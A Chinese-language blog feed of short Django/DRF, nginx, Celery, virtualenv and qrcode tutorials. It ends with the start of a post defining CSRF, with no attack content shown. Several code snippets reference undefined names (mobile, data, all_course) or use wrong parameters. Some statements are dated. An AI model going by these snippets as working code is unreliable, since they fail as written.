<p>2，某个字段不属于指定model，它是read_only，只需要将它序列化传递给用户，但是在这个model中，没有这个字段！我们需要用到SerializerMethodField。<br>　　假设需要返回用户加入这个网站多久了，不可能维持这样加入的天数这样一个数据，一般会记录用户加入的时间点，然后当用户获取这个数据，我们再计算返回给它。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class UserSerializer(serializers.ModelSerializer):  </span><br><span class="line">    days_since_joined = serializers.SerializerMethodField()</span><br><span class="line">    # 方法写法：get_ + 字段</span><br><span class="line">    def get_days_since_joined(self, obj):</span><br><span class="line">    # obj指这个model的对象</span><br><span class="line">        return (now() - obj.date_joined).days</span><br><span class="line"> </span><br><span class="line">    class Meta:</span><br><span class="line">        model = User123456789</span><br></pre></td></tr></table></figure></p>
<h1 id="Validation自定义验证逻辑"><a href="#Validation自定义验证逻辑" class="headerlink" title="Validation自定义验证逻辑"></a>Validation自定义验证逻辑</h1><p>单独的validate<br>我们在上面提到field，它能起到一定的验证作用，但很明显，它存在很大的局限性，举个简单的例子，我们要判断我们手机号码，如果使用CharField(max_length=11, min_length=11），它只能确保我们输入的是11个字符，那么我们需要自定义！<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mobile_phone = serializers.CharField(max_length=11, min_length=11）</span><br><span class="line"> </span><br><span class="line">def validate_mobile_phone(self, mobile_phone):</span><br><span class="line">    # 注意参数，self以及字段名</span><br><span class="line">    # 注意函数名写法，validate_ + 字段名字</span><br><span class="line">    if not re.match(REGEX_MOBILE, mobile):</span><br><span class="line">    # REGEX_MOBILE表示手机的正则表达式</span><br><span class="line">        raise serializers.ValidationError(&quot;手机号码非法&quot;)</span><br><span class="line">    return mobile_phone123456789</span><br></pre></td></tr></table></figure></p>
<p>当然，这里面还可以加入很多逻辑，例如，还可以判断手机是否原本就存在数据库等等。</p>
<h2 id="联合validate"><a href="#联合validate" class="headerlink" title="联合validate"></a>联合validate</h2><p>上面验证方式，只能验证一个字段，如果是两个字段联合在一起进行验证，那么我们就可以重载validate( )方法。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">start = serializers.DateTimeField()</span><br><span class="line">finish = serializers.DateTimeField()</span><br><span class="line"> </span><br><span class="line">def validate(self, attrs):</span><br><span class="line"># 传进来什么参数，就返回什么参数，一般情况下用attrs</span><br><span class="line">    if data[&apos;start&apos;] &gt; data[&apos;finish&apos;]:</span><br><span class="line">        raise serializers.ValidationError(&quot;finish must occur after start&quot;)</span><br><span class="line">    return attrs12345678</span><br></pre></td></tr></table></figure></p>
<p>这个方法非常的有用，我们还可以再这里对一些read_only的字段进行操作，我们在read_only提及到一个例子，订单号的生成，我们可以在这步生成一个订单号，然后添加到attrs这个字典中。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">order_sn = serializers.CharField(readonly=True)</span><br><span class="line">def validate(self, attrs):</span><br><span class="line">    # 调用一个方法生成order_sn</span><br><span class="line">    attrs[&apos;order_sn&apos;] = generate_order_sn()</span><br><span class="line">    return attrs12345</span><br></pre></td></tr></table></figure></p>
<p>这个方法运用在modelserializer中，可以剔除掉write_only的字段，这个字段只验证，但不存在与指定的model当中，即不能save( )，可以在这delete掉！</p>
<h2 id="Validators"><a href="#Validators" class="headerlink" title="Validators"></a>Validators</h2><p>validators可以直接作用于某个字段，这个时候，它与单独的validate作用差不多<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def multiple_of_ten(value):</span><br><span class="line">    if value % 10 != 0:</span><br><span class="line">        raise serializers.ValidationError(&apos;Not a multiple of ten&apos;)</span><br><span class="line"> </span><br><span class="line">class GameRecord(serializers.Serializer):</span><br><span class="line">    score = IntegerField(validators=[multiple_of_ten])123456</span><br></pre></td></tr></table></figure></p>
<p>当然，drf提供的validators还有很好的功能：UniqueValidator，UniqueTogetherValidator等<br>　　UniqueValidator: 指定某一个对象是唯一的，如，用户名只能存在唯一：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username = serializers.CharField(</span><br><span class="line">        max_length=11, </span><br><span class="line">        min_length=11,</span><br><span class="line">        validators=[UniqueValidator(queryset=UserProfile.objects.all())</span><br><span class="line">    ）12345</span><br></pre></td></tr></table></figure></p>
<p>UniqueTogetherValidator: 联合唯一，如用户收藏某个课程，这个时候就不能单独作用于某个字段，我们在Meta中设置。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class Meta:</span><br><span class="line">    validators = [</span><br><span class="line">        UniqueTogetherValidator(</span><br><span class="line">            queryset=UserFav.objects.all(),</span><br><span class="line">            fields=(&apos;user&apos;, &apos;course&apos;),</span><br><span class="line">            message=&apos;已经收藏&apos;</span><br><span class="line">        )]</span><br></pre></td></tr></table></figure></p>
<h2 id="关于外键的serializers"><a href="#关于外键的serializers" class="headerlink" title="关于外键的serializers"></a>关于外键的serializers</h2><p>其实，外键的field也比较简单，如果我们直接使用serializers.Serializer，那么直接用PrimaryKeyRelatedField就解决了。<br>  假设现在有一门课python入门教学(course)，它的类别是python(catogory)。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 指定queryset</span><br><span class="line">category = serializers.PrimaryKeyRelatedField(queryset=CourseCategory.objects.all(), required=True)</span><br></pre></td></tr></table></figure></p>
<p>ModelSerializer就更简单了，直接通过映射就好了<br>  不过这样只是用户获得的只是一个外键类别的id，并不能获取到详细的信息，如果想要获取到具体信息，那需要嵌套serializer</p>
<p><code>category = CourseCategorySerializer()</code><br>注意：上面两种方式，外键都是正向取得，下面介绍怎么反向去取，如，我们需要获取python这个类别下，有什么课程。  首先，在课程course的model中，需要在外键中设置related_name<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class Course(model.Model):</span><br><span class="line">    category = models.ForeignKey(CourseCategory, related_name=&apos;courses&apos;)</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 反向取课程，通过related_name</span><br><span class="line"># 一对多，一个类别下有多个课程，一定要设定many=True</span><br><span class="line">courses = CourseSerializer(many=True)</span><br></pre></td></tr></table></figure>
<p>写到这里，外键就基本讲完了！还有一个小问题：我们在上面提到ModelSerializer需要解决的第二个问题中，其实还有一种情况，就是某个字段属于指定model，但不能获取到相关数据。<br>  假设现在是一个多级分类的课程，例如，编程语言–&gt;python–&gt;python入门学习课程，编程语言与python属于类别，另外一个属于课程，编程语言类别是python类别的一个外键，而且属于同一个model，实现方法：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">parent_category = models.ForeignKey(&apos;self&apos;, null=True, blank=True, </span><br><span class="line">                    verbose_name=&apos;父类目别&apos;,</span><br><span class="line">                    related_name=&apos;sub_cat&apos;)</span><br></pre></td></tr></table></figure></p>
<p>现在获取编程语言下的课程，显然无法直接获取到python入门学习这个课程，因为它们两没有外键关系。SerializerMethodField( )也可以解决这个问题，只要在自定义的方法中实现相关的逻辑即可！<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">courses = SerializerMethodField()</span><br><span class="line">def get_courses(self, obj):</span><br><span class="line">    all_courses = Course.objects.filter(category__parent_category_id=obj.id)</span><br><span class="line">    courses_serializer = CourseSerializer(all_course, many=True, </span><br><span class="line">                    context=&#123;&apos;request&apos;: self.context[&apos;request&apos;]&#125;)</span><br><span class="line">    return courses_serializer.data</span><br></pre></td></tr></table></figure></p>
<p>上面的例子看起来有点奇怪，因为我们在SerializerMethodField()嵌套了serializer，就需要自己进行序列化，然后再从data就可以取出json数据。<br>  可以看到传递的参数是分别是：queryset，many=True多个对象，context上下文。这个context十分关键，如果不将request传递给它，在序列化的时候，图片与文件这些Field不会再前面加上域名，也就是说，只会有/media/img…这样的路径！</p>
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle" style="display:block; text-align:center;" data-ad-layout="in-article" data-ad-format="fluid" data-ad-client="ca-pub-7384725227124412" data-ad-slot="5674861023"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>]]></content>
      <categories>
        <category>django</category>
      </categories>
  </entry>
  <entry>
    <title>Django 使用createsuperuser创建超级用户后不能登录后台的解决方案</title>
    <url>/2019/02/06/django_superuser/</url>
    <content><![CDATA[<h1 id="错误原因"><a href="#错误原因" class="headerlink" title="错误原因"></a>错误原因</h1><p>在使用drf的信号量之后，会把密码再次加密</p>
<h1 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h1><h2 id="修改密码"><a href="#修改密码" class="headerlink" title="修改密码"></a>修改密码</h2><p>python manage.py changepassword</p>
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle" style="display:block; text-align:center;" data-ad-layout="in-article" data-ad-format="fluid" data-ad-client="ca-pub-7384725227124412" data-ad-slot="5674861023"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>]]></content>
      <categories>
        <category>django</category>
      </categories>
  </entry>
  <entry>
    <title>在一个字段输入中文是出现错误1366-incorrect string value:\xE7\x8E\x8B for column</title>
    <url>/2019/02/06/mysql_error/</url>
    <content><![CDATA[<h1 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h1><h2 id="set-names-utf8"><a href="#set-names-utf8" class="headerlink" title="set names utf8"></a>set names utf8</h2><script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle" style="display:block; text-align:center;" data-ad-layout="in-article" data-ad-format="fluid" data-ad-client="ca-pub-7384725227124412" data-ad-slot="5674861023"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script><div><h1>推荐文章<span style="font-size:0.45em; color:gray"></h1><ul><li><a href="https://thelighter.github.io/2018/11/20/workbrench/">mysql——workbrench的用法</a></li></ul></div>]]></content>
      <categories>
        <category>mysql</category>
      </categories>
      <tags>
        <tag>mysql</tag>
      </tags>
  </entry>
  <entry>
    <title>使用Celery时候报错AttributeError: &#39;float&#39; object has no attribute &#39;items&#39;</title>
    <url>/2019/02/06/celery_error/</url>
    <content><![CDATA[<h1 id="错误信息"><a href="#错误信息" class="headerlink" title="错误信息"></a>错误信息</h1><p><code>AttributeError: &#39;float&#39; object has no attribute &#39;items&#39;</code></p>
<h1 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h1><h2 id="解决方案：使用pip回滚redis：-pip-install-redis-2-10-6"><a href="#解决方案：使用pip回滚redis：-pip-install-redis-2-10-6" class="headerlink" title="解决方案：使用pip回滚redis： pip install redis==2.10.6"></a>解决方案：使用pip回滚redis： pip install redis==2.10.6</h2><script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle" style="display:block; text-align:center;" data-ad-layout="in-article" data-ad-format="fluid" data-ad-client="ca-pub-7384725227124412" data-ad-slot="5674861023"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script><div><h1>推荐文章<span style="font-size:0.45em; color:gray"></h1><ul><li><a href="https://thelighter.github.io/2019/05/07/celery-kombu-exception/">kombu.exceptions.EncodeError EncodeError</a></li><li><a href="https://thelighter.github.io/2019/05/06/celery-1/">分布式任务队列Celery的特性</a></li></ul></div>]]></content>
      <categories>
        <category>django</category>
      </categories>
      <tags>
        <tag>celery</tag>
      </tags>
  </entry>
  <entry>
    <title>django数据模型中关于on_delete的使用</title>
    <url>/2019/02/06/django_ondelete/</url>
    <content><![CDATA[<h1 id="常见用法"><a href="#常见用法" class="headerlink" title="常见用法"></a>常见用法</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class BookModel(models.Model):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    书籍表</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    book_name = models.CharField(max_length=100, verbose_name=&apos;书名&apos;)</span><br><span class="line">    # 表示外键关联到作者表,当作者表删除了该条数据,图书表中不删除,仅仅是把外键置空</span><br><span class="line">    author = models.ForeignKey(AuthModel, null=True, blank=True, on_delete=models.SET_NULL)</span><br><span class="line">    price = models.FloatField(verbose_name=&apos;价格&apos;)</span><br><span class="line">    create_time = models.DateTimeField(auto_now_add=True, verbose_name=&apos;添加时间&apos;)</span><br></pre></td></tr></table></figure>
<h1 id="选项及含义"><a href="#选项及含义" class="headerlink" title="选项及含义"></a>选项及含义</h1><ul>
<li>CASCADE:这就是默认的选项，级联删除，你无需显性指定它。</li>
<li>PROTECT: 保护模式，如果采用该选项，删除的时候，会抛出ProtectedError错误。</li>
<li>SET_NULL: 置空模式，删除的时候，外键字段被设置为空，前提就是blank=True, null=True,定义该字段的时候，允许为空。</li>
<li>SET_DEFAULT: 置默认值，删除的时候，外键字段设置为默认值，所以定义外键的时候注意加上一个默认值。</li>
<li>SET(): 自定义一个值，该值当然只能是对应的实体了</li>
</ul>
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle" style="display:block; text-align:center;" data-ad-layout="in-article" data-ad-format="fluid" data-ad-client="ca-pub-7384725227124412" data-ad-slot="5674861023"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>]]></content>
      <categories>
        <category>django</category>
      </categories>
      <tags>
        <tag>on_delete的参数</tag>
      </tags>
  </entry>
  <entry>
    <title>nginx: [alert] kill(1668, 1) failed (3: No such process)的解决办法及nginx常用命令总结</title>
    <url>/2019/02/06/nginx_1/</url>
    <content><![CDATA[<h1 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h1><p>更改完nginx.conf文件后，执行/application/nginx/sbin/nginx -s reload命令重新加载配置文件，报以下错误信息：</p>
<p>nginx: [alert] kill(1668, 1) failed (3: No such process)</p>
<p>提示没有相关进程。</p>
<h1 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h1><p>其实这个问题很低级的说，就是我之前压根就没有启动nginx服务，执行/app/nginx/sbin/nginx，开启nginx服务后，重新加载nginx配置，一切正常！</p>
<h1 id="nginx服务管理常用命令"><a href="#nginx服务管理常用命令" class="headerlink" title="nginx服务管理常用命令"></a>nginx服务管理常用命令</h1><p>/application/nginx/sbin/nginx -t –检查语法</p>
<p>/application/nginx/sibn/nginx -s reload —平滑加载配置文件(建议使用这个)</p>
<p>/application/nginx/sbin/nginx —启动nginx服务 </p>
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle" style="display:block; text-align:center;" data-ad-layout="in-article" data-ad-format="fluid" data-ad-client="ca-pub-7384725227124412" data-ad-slot="5674861023"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script><div><h1>推荐文章<span style="font-size:0.45em; color:gray"></h1><ul><li><a href="https://thelighter.github.io/2019/01/06/ubuntu_nginx/">Ubuntu的nginx安装配置</a></li><li><a href="https://thelighter.github.io/2019/01/06/nginx_init/">nginx启动关闭重启脚本制作的步骤</a></li></ul></div>]]></content>
      <categories>
        <category>nginx</category>
      </categories>
      <tags>
        <tag>nginx</tag>
      </tags>
  </entry>
  <entry>
    <title>virtualenv和virtualenvwrapper使用方法大全</title>
    <url>/2019/02/06/virtualenv_virtualenvwrapper/</url>
    <content><![CDATA[<h1 id="vritualenv"><a href="#vritualenv" class="headerlink" title="vritualenv"></a>vritualenv</h1><p>使不同应用开发环境独立</p>
<p>环境升级不影响其他应用，也不会影响全局的python环境</p>
<p>它可以防止系统中出现包管理混乱和版本的冲突</p>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p><code>pip install virtualenv</code></p>
<h1 id="virtualenvwrapper"><a href="#virtualenvwrapper" class="headerlink" title="virtualenvwrapper"></a>virtualenvwrapper</h1><p>virtualenvwrapper是virtualenv的扩展管理包，用于更方便管理虚拟环境</p>
<p>优点：</p>
<p>将所有虚拟环境整合在一个目录下</p>
<p>管理（新增，删除，复制）虚拟环境</p>
<p>切换虚拟环境</p>
<h2 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h2><p>windows安装virtualenvwrapper：<code>pip install virtualenvwrapper-win</code><br>linux安装virtualenvwrapper：<code>pip install virtualenvwrapper</code></p>
<h2 id="设置WORK-HOME环境变量"><a href="#设置WORK-HOME环境变量" class="headerlink" title="设置WORK_HOME环境变量"></a>设置WORK_HOME环境变量</h2><p>位于环境变量中设置</p>
<h2 id="创建虚拟环境"><a href="#创建虚拟环境" class="headerlink" title="创建虚拟环境"></a>创建虚拟环境</h2><ul>
<li>mkvirtualenv testvir</li>
<li>python2和python3同时存在一台电脑，指定python版本解决方法</li>
<li>mkvirtualenv –python=python版本的python.exe路径 虚拟环境名称</li>
</ul>
<h2 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h2><ul>
<li><p>创建基本环境：mkvirtualenv [环境名]</p>
</li>
<li><p>删除环境：rmvirtualenv [环境名]</p>
</li>
<li><p>激活环境：workon [环境名]</p>
</li>
<li><p>退出环境：deactivate</p>
</li>
<li><p>列出所有环境：workon 或者 lsvirtualenv -b</p>
</li>
</ul>
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle" style="display:block; text-align:center;" data-ad-layout="in-article" data-ad-format="fluid" data-ad-client="ca-pub-7384725227124412" data-ad-slot="5674861023"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>virtualenv</tag>
        <tag>virtualenvwrapper</tag>
      </tags>
  </entry>
  <entry>
    <title>Django_extensions的Django REST framework中使用缓存</title>
    <url>/2019/02/06/django_extensions/</url>
    <content><![CDATA[<h1 id="使用缓存"><a href="#使用缓存" class="headerlink" title="使用缓存"></a>使用缓存</h1><p>省市区的数据是经常被用户查询使用的，而且数据基本不变化，所以我们可以将省市区数据进行缓存处理，减少数据库的查询次数。</p>
<p>在Django REST framework中使用缓存，可以通过drf-extensions扩展来实现。</p>
<p>关于扩展使用缓存的文档，可参考链接<a href="http://chibisov.github.io/drf-extensions/docs/#caching" target="_blank" rel="noopener">http://chibisov.github.io/drf-extensions/docs/#caching</a></p>
<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>pip install drf-extensions</p>
<h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><h2 id="装饰器"><a href="#装饰器" class="headerlink" title="装饰器"></a>装饰器</h2><p>@cache_response(timeout=60*60, cache=’default’)</p>
<h2 id="使用drf-extensions提供的扩展类"><a href="#使用drf-extensions提供的扩展类" class="headerlink" title="使用drf-extensions提供的扩展类"></a>使用drf-extensions提供的扩展类</h2><p>drf-extensions扩展对于缓存提供了三个扩展类：</p>
<ul>
<li>ListCacheResponseMixin</li>
</ul>
<p>用于缓存返回列表数据的视图，与ListModelMixin扩展类配合使用，实际是为list方法添加了cache_response装饰器</p>
<ul>
<li>RetrieveCacheResponseMixin</li>
</ul>
<p>用于缓存返回单一数据的视图，与RetrieveModelMixin扩展类配合使用，实际是为retrieve方法添加了cache_response装饰器</p>
<ul>
<li>CacheResponseMixin</li>
</ul>
<p>为视图集同时补充List和Retrieve两种缓存，与ListModelMixin和RetrieveModelMixin一起配合使用。</p>
<p>三个扩展类都是在rest_framework_extensions.cache.mixins中。</p>
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle" style="display:block; text-align:center;" data-ad-layout="in-article" data-ad-format="fluid" data-ad-client="ca-pub-7384725227124412" data-ad-slot="5674861023"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>]]></content>
      <categories>
        <category>django</category>
      </categories>
      <tags>
        <tag>Django_extensions</tag>
      </tags>
  </entry>
  <entry>
    <title>Django-channels实现websockets</title>
    <url>/2019/02/06/django_websockets/</url>
    <content><![CDATA[<h1 id="使用WebSockets（通过Django-Channels实现）可以管理客户端和服务器端之间的通信，只要用户登录，这个事件将会广播至每个连接的用户，他们的浏览器会自动刷新页面。"><a href="#使用WebSockets（通过Django-Channels实现）可以管理客户端和服务器端之间的通信，只要用户登录，这个事件将会广播至每个连接的用户，他们的浏览器会自动刷新页面。" class="headerlink" title="使用WebSockets（通过Django Channels实现）可以管理客户端和服务器端之间的通信，只要用户登录，这个事件将会广播至每个连接的用户，他们的浏览器会自动刷新页面。"></a>使用WebSockets（通过Django Channels实现）可以管理客户端和服务器端之间的通信，只要用户登录，这个事件将会广播至每个连接的用户，他们的浏览器会自动刷新页面。</h1><p>运行环境：</p>
<p>Python(v3.6.0)<br>Django(v1.10.5)<br>Django Channels(v1.0.3)<br>Redis(v3.2.8)</p>
<p>原文链接：<a href="https://www.jianshu.com/p/e2e45c0e6c81" target="_blank" rel="noopener">https://www.jianshu.com/p/e2e45c0e6c81</a></p>
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle" style="display:block; text-align:center;" data-ad-layout="in-article" data-ad-format="fluid" data-ad-client="ca-pub-7384725227124412" data-ad-slot="5674861023"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>]]></content>
      <categories>
        <category>django</category>
      </categories>
      <tags>
        <tag>django-channels</tag>
      </tags>
  </entry>
  <entry>
    <title>Django的models的meta选项和属性</title>
    <url>/2019/02/06/django_meta/</url>
    <content><![CDATA[<h1 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class Foo(models.Model):</span><br><span class="line">    bar = models.CharField(max_length=30)</span><br><span class="line">    </span><br><span class="line">    class Meta:</span><br><span class="line">        #......</span><br></pre></td></tr></table></figure>
<h1 id="选项"><a href="#选项" class="headerlink" title="选项"></a>选项</h1><h2 id="app-label"><a href="#app-label" class="headerlink" title="app_label"></a>app_label</h2><p>app_label这个选项只在一种情况下使用，就是你的模型类不在默认的应用程序包下的models.py文件中，这时候你需要指定你这个模型类是那个应用程序的。比如你在其他地方写了一个模型类，而这个模型类是属于myapp的，那么你这是需要指定为：<br>app_label=’myapp’</p>
<h2 id="db-table"><a href="#db-table" class="headerlink" title="db_table"></a>db_table</h2><p>db_table是用于指定自定义数据库表名的。Django有一套默认的按照一定规则生成数据模型对应的数据库表名，如果你想使用自定义的表名，就通过这个属性指定，比如：<br>table_name=’my_owner_table’   </p>
<p>若不提供该参数, Django 会使用 app_label + ‘_’ + module_name 作为表的名字.<br>若你的表的名字是一个 SQL 保留字, 或包含 Python 变量名不允许的字符–特别是连字符 –没关系. Django 会自动在幕后替你将列名字和表名字用引号引起来.</p>
<h2 id="db-tablespace"><a href="#db-tablespace" class="headerlink" title="db_tablespace"></a>db_tablespace</h2><p>有些数据库有数据库表空间，比如Oracle。你可以通过db_tablespace来指定这个模型对应的数据库表放在哪个数据库表空间。<br>get_latest_by<br>由于Django的管理方法中有个lastest()方法，就是得到最近一行记录。如果你的数据模型中有 DateField 或 DateTimeField 类型的字段，你可以通过这个选项来指定lastest()是按照哪个字段进行选取的。<br>一个 DateField 或 DateTimeField 字段的名字. 若提供该选项, 该模块将拥有一个 get_latest() 函数以得到 “最新的” 对象(依据那个字段):<br>get_latest_by = “order_date”</p>
<h2 id="managed"><a href="#managed" class="headerlink" title="managed"></a>managed</h2><p>由于Django会自动根据模型类生成映射的数据库表，如果你不希望Django这么做，可以把managed的值设置为False。<br>默认值为True,这个选项为True时Django可以对数据库表进行 migrate或migrations、删除等操作。在这个时间Django将管理数据库中表的生命周期<br>如果为False的时候，不会对数据库表进行创建、删除等操作。可以用于现有表、数据库视图等，其他操作是一样的。<br>order_with_respect_to<br>这个选项一般用于多对多的关系中，它指向一个关联对象。就是说关联对象找到这个对象后它是经过排序的。指定这个属性后你会得到一个get_XXX_order()和set_XXX_order（）的方法,通过它们你可以设置或者回去排序的对象。<br>举例来说, 如果一个 PizzaToppping 关联到一个 Pizza 对象, 这样做:<br>order_with_respect_to = ‘pizza’</p>
<h2 id="ordering"><a href="#ordering" class="headerlink" title="ordering"></a>ordering</h2><p>这个字段是告诉Django模型对象返回的记录结果集是按照哪个字段排序的。比如下面的代码：<br>    ordering=[‘order_date’] </p>
<pre><code>- 按订单升序排列
ordering=[&apos;-order_date&apos;] 
- 按订单降序排列，-表示降序
ordering=[&apos;?order_date&apos;] 
- 随机排序，？表示随机
ordering = [&apos;-pub_date&apos;, &apos;author&apos;]
- 对 pub_date 降序,然后对 author 升序
</code></pre><p>需要注意的是:不论你使用了多少个字段排序, admin 只使用第一个字段</p>
<h2 id="permissions"><a href="#permissions" class="headerlink" title="permissions"></a>permissions</h2><p>permissions主要是为了在Django Admin管理模块下使用的，如果你设置了这个属性可以让指定的方法权限描述更清晰可读。<br>要创建一个对象所需要的额外的权限. 如果一个对象有 admin 设置, 则每个对象的添加,删除和改变权限会人(依据该选项)自动创建.下面这个例子指定了一个附加权限: can_deliver_pizzas:<br>permissions = ((“can_deliver_pizzas”, “Can deliver pizzas”),)</p>
<p>这是一个2-元素 tuple 的tuple或列表, 其中两2-元素 tuple 的格式为:(permission_code, human_readable_permission_name).</p>
<h2 id="unique-together"><a href="#unique-together" class="headerlink" title="unique_together"></a>unique_together</h2><p>unique_together这个选项用于：当你需要通过两个字段保持唯一性时使用。这会在 Django admin 层和数据库层同时做出限制(也就是相关的 UNIQUE 语句会被包括在 CREATE TABLE 语句中)。比如：一个Person的FirstName和LastName两者的组合必须是唯一的，那么需要这样设置：<br>unique_together = ((“first_name”, “last_name”),)</p>
<h2 id="verbose-name"><a href="#verbose-name" class="headerlink" title="verbose_name"></a>verbose_name</h2><p>verbose_name的意思很简单，就是给你的模型类起一个更可读的名字：<br>verbose_name = “pizza”</p>
<p>若未提供该选项, Django 则会用一个类名字的 munged 版本来代替: CamelCase becomes camel case.</p>
<h2 id="verbose-name-plural"><a href="#verbose-name-plural" class="headerlink" title="verbose_name_plural"></a>verbose_name_plural</h2><p>这个选项是指定模型的复数形式是什么，比如：<br>verbose_name_plural = “stories”</p>
<p>若未提供该选项, Django 会使用 verbose_name + “s”.</p>
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle" style="display:block; text-align:center;" data-ad-layout="in-article" data-ad-format="fluid" data-ad-client="ca-pub-7384725227124412" data-ad-slot="5674861023"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script><div><h1>推荐文章<span style="font-size:0.45em; color:gray"></h1><ul><li><a href="https://thelighter.github.io/2019/01/06/nginx_init/">nginx启动关闭重启脚本制作的步骤</a></li><li><a href="https://thelighter.github.io/2019/01/02/django2.1_namespace/">django2.1的namespace的用法与注意事项</a></li><li><a href="https://thelighter.github.io/2018/12/19/django_verify/">Django基于pillow的登录验证码生成</a></li><li><a href="https://thelighter.github.io/2018/12/14/pycharm_django/">使用pycharm 做django开发的时候模板出现提示语句</a></li><li><a href="https://thelighter.github.io/2018/12/14/django_404/">Django2.1中对于请求的数据不存在的404处理</a></li></ul></div>]]></content>
      <categories>
        <category>django</category>
      </categories>
      <tags>
        <tag>django</tag>
      </tags>
  </entry>
  <entry>
    <title>Python生成二维码</title>
    <url>/2019/02/06/qrcode/</url>
    <content><![CDATA[<blockquote>
<p>利用python的qrcode可以生成链接的二维码</p>
</blockquote>
<h1 id="用Python来生成二维码很简单，可以看-qrcode-这个包："><a href="#用Python来生成二维码很简单，可以看-qrcode-这个包：" class="headerlink" title="用Python来生成二维码很简单，可以看 qrcode 这个包："></a>用Python来生成二维码很简单，可以看 qrcode 这个包：</h1><p>pip install qrcode<br>qrcode 依赖 Image 这个包：</p>
<p>pip install Image<br>如果这个包安装有困难，可选纯Python的包来实现此功能，见下文。</p>
<h1 id="安装后就可以使用了，这个程序带了一个-qr-命令："><a href="#安装后就可以使用了，这个程序带了一个-qr-命令：" class="headerlink" title="安装后就可以使用了，这个程序带了一个 qr 命令："></a>安装后就可以使用了，这个程序带了一个 qr 命令：</h1><p>qr ‘<a href="http://www.ziqiangxuetang.com&#39;" target="_blank" rel="noopener">http://www.ziqiangxuetang.com&#39;</a> &gt; test.png</p>
<h1 id="下面我们看一下如何在-代码-中使用"><a href="#下面我们看一下如何在-代码-中使用" class="headerlink" title="下面我们看一下如何在 代码 中使用"></a>下面我们看一下如何在 代码 中使用</h1><p>import qrcode</p>
<p>img = qrcode.make(‘<a href="http://www.tuweizhong.com&#39;" target="_blank" rel="noopener">http://www.tuweizhong.com&#39;</a>)</p>
<p>with open(‘test.png’, ‘wb’) as f:<br>    img.save(f)<br>这样就可以生成一个带有网址的二维码，但是这样得把文件保存到硬盘中。</p>
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle" style="display:block; text-align:center;" data-ad-layout="in-article" data-ad-format="fluid" data-ad-client="ca-pub-7384725227124412" data-ad-slot="5674861023"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>qrcode</tag>
      </tags>
  </entry>
  <entry>
    <title>CSRF, XSS, Sql注入的过程原理和处理方案</title>
    <url>/2019/02/06/web_secure/</url>
    <content><![CDATA[<h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><p>含义</p>
<p>CSRF（Cross-site request forgery）跨站请求伪造，也被称为“One Click Attack”或者Session Riding，通常缩写为CSRF或者XSRF，是一种对网站的恶意利用。尽管听起来像跨站脚本（XSS），但它与XSS非常不同，XSS利用站点内的信任用户，而CSRF则通过伪装来自受信任用户的请求来利用受信任的网站。与XSS攻击相比，CSRF攻击往往不大流行（因此对其进行防范的资源也相当稀少）和难以防范，所以被认为比XSS更具危险性。</p>
